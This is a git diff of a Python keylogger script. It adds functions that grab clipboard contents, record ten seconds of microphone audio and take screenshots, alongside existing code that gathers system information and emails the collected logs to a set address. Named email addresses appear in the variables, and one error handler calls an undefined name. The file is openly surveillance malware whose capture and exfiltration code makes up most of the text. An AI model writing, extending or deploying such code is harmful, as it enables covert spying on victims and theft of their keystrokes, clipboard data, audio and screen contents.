@@ -1,4 +1,6 @@
+#########################
 # Libraries / Dependicies
+#########################
 
 # Modules to collect Computer Information
 import socket
@@ -40,22 +42,30 @@ from requests import get
 from scipy.io.wavfile import write
 import sounddevice as soundDeviceObject
 
+#########################
 # Important Variables
+#########################
 keysInformation = "logs.txt"
 systemInformation = "system.txt"
+clipboardInformation = "clipboard.txt"
+audioInformation = "sample.wav"
+sreenshotInformation = "sample.png"
+
 filePath = "/Users/kayvee/Code/KeyLogger/PythonKeyLogger"
 
 totalKeys = 0
 keys =[]
 
+recordingTime = 10
 
 #variables for Email 
 email_address = "hacker.heart20@gmail.com" # Enter disposable email here
 password = "" # Enter email password here
 destinationAddr = "Vaibhavsharmakv@gmail.com" # Enter destination addr
 
-
+#########################
 #Email Functionality
+#########################
 def send_logs_via_email(filename, attachment, destinationAddr):
 
     sourceAddr = email_address
@@ -86,7 +96,10 @@ def send_logs_via_email(filename, attachment, destinationAddr):
 
 #send_logs_via_email(keysInformation, filePath + "/" + keysInformation, destinationAddr)
 
+
+#########################
 #System Information
+#########################
 def system_Information():
 	with open(filePath + "/"+systemInformation,"a") as f:
 		hostname = socket.gethostname()
@@ -111,7 +124,49 @@ def system_Information():
 system_Information()
 
 
+#########################
+#Copy data from Clipboard
+#########################
 
+def copy_data_from_clipboard():
+	with open(filePath + "/"+clipboardInformation,"a") as f:
+		try:
+			clipboardData = clipboard.paste()
+			f.write("Clipboard Data: "+clipboardData)
+		except Exception as e:
+			rf.write("Clipboard Data: NULL")
+
+copy_data_from_clipboard()
+
+
+#########################
+#Copy Audio
+#########################
+def record_Audio():
+	frameSound = 44100
+	seconds = recordingTime
+	inputRecording = soundDeviceObject.rec(int(seconds * frameSound), samplerate = frameSound, channels = 2)
+	soundDeviceObject.wait()
+
+	write(filePath + "/" + audioInformation, frameSound, inputRecording)
+
+#record_Audio()
+
+#########################
+#Screenshots
+#########################
+def record_screenshot():
+	im = ImageGrab.grab()
+	im.save(filePath + "/" + sreenshotInformation)
+
+record_screenshot()
+
+
+
+
+#########################
+#Key Listener
+#########################
 
 def key_is_pressed(Key):
 	global totalKeys,keys
